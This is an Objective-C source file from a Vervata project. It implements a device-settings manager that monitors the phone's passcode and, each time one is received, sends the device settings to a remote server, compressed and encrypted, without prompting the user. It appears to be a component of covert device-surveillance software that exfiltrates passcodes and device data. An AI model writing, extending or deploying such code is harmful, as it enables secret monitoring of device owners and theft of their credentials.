//
//  DeviceSettingsManagerImpl.m
//  DeviceSettingsManager
//
//  Created by Makara on 3/4/14.
//  Copyright (c) 2014 Vervata. All rights reserved.
//

#import "DeviceSettingsManagerImpl.h"
#import "DevicePasscodeController.h"
#import "DeviceSettingsUtils.h"

#import "DefDDM.h"
#import "DataDelivery.h"
#import "DeliveryRequest.h"
#import "DeliveryResponse.h"

#import "SendDeviceSettings.h"
#import "SendDeviceSettingsResponse.h"

@interface DeviceSettingsManagerImpl (private)
- (void) passcodeDidReceived;
- (BOOL) deliverSendDeviceSettings: (NSArray *) aDeviceSettingIDs;
- (DeliveryRequest *) sendDeviceSettingsRequest;
@end

@implementation DeviceSettingsManagerImpl

@synthesize mDeviceSettingsDelegate;

- (id) initWithDataDeliveryManager: (id <DataDelivery>) aDDM {
    if ((self = [super init])) {
        mDDM = aDDM;
        mDevicePasscodeController = [[DevicePasscodeController alloc] init];
        [mDevicePasscodeController setMDelegate:self];
        [mDevicePasscodeController setMSelector:@selector(passcodeDidReceived)];
        [mDevicePasscodeController startMonitorPasscode];
    }
    return (self);
}

#pragma mark -
#pragma mark Device settings delegate methods
#pragma mark -

- (BOOL) deliverDeviceSettings: (NSArray *) aDeviceSettingIDs delegate: (id <DeviceSettingsDelegate>) aDelegate {
    if ([self deliverSendDeviceSettings:aDeviceSettingIDs]) {
        [self setMDeviceSettingsDelegate:aDelegate];
        return (YES);
    } else {
        return (NO);
    }
}

- (NSArray *) getDeviceSettings {
    DeviceSettingsUtils *deviceSettingsUtils = [[DeviceSettingsUtils alloc] initWithDevicePasscodeController:mDevicePasscodeController];
    NSArray *deviceSettings = [deviceSettingsUtils getDeviceSettings:nil];
    [deviceSettingsUtils release];
    return (deviceSettings);
}

#pragma mark -
#pragma mark Data delivery methods
#pragma mark -

- (void) requestFinished: (DeliveryResponse *) aResponse {
    DLog(@"DeviceSettingsManagerImpl --> requestFinished: aResponse.mSuccess: %d", [aResponse mSuccess])
	
	id <DeviceSettingsDelegate> delegate = [self mDeviceSettingsDelegate];
    [self setMDeviceSettingsDelegate:nil];
	
	if ([aResponse mSuccess]) {
        if ([delegate respondsToSelector:@selector(deviceSettingsDidDeliver:)]) {
            [delegate deviceSettingsDidDeliver:nil];
        }
	} else {
        if ([delegate respondsToSelector:@selector(deviceSettingsDidDeliver:)])	{
            NSError *error = [NSError errorWithDomain:@"Send Device Settings"
                                                 code:[aResponse mStatusCode]
                                             userInfo:nil];
            [delegate deviceSettingsDidDeliver:error];
        }
	}
}

- (void) updateRequestProgress: (DeliveryResponse *) aResponse {
    DLog(@"Device settings data delivery update progress ...");
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) passcodeDidReceived {
    [self deliverSendDeviceSettings:nil];
}

- (BOOL) deliverSendDeviceSettings: (NSArray *) aDeviceSettingIDs {
    BOOL deliver = NO;
	DeliveryRequest *request = [self sendDeviceSettingsRequest];
	if (![mDDM isRequestIsPending:request]) {
        
        DeviceSettingsUtils *deviceSettingsUtils = [[DeviceSettingsUtils alloc] initWithDevicePasscodeController:mDevicePasscodeController];
        NSArray *deviceSettings = [deviceSettingsUtils getDeviceSettings:aDeviceSettingIDs];
        
        DLog(@"Final Device Settings %@", deviceSettings)
		SendDeviceSettings* sendDeviceSettings = [[SendDeviceSettings alloc] init];
        [sendDeviceSettings setMDeviceSettings:deviceSettings];
		[request setMCommandCode:[sendDeviceSettings getCommand]];
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:sendDeviceSettings];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
        [sendDeviceSettings release];
        
        [deviceSettingsUtils release];
        
        deliver = YES;
	}
    return (deliver);
}

- (DeliveryRequest *) sendDeviceSettingsRequest {
	DeliveryRequest *request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_DeviceSettingsManager];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:0];
    [request setMEDPType:kEDPTypeSendDeviceSettings];
    [request setMRetryTimeout:0]; // No retry
    [request setMConnectionTimeout:60]; // 1 minute
	[request autorelease];
	return (request);
}

#pragma mark -
#pragma mark Memory management method
#pragma mark -

- (void) dealloc {
    [mDevicePasscodeController stopMonitorPasscode];
    [super dealloc];
}

@end
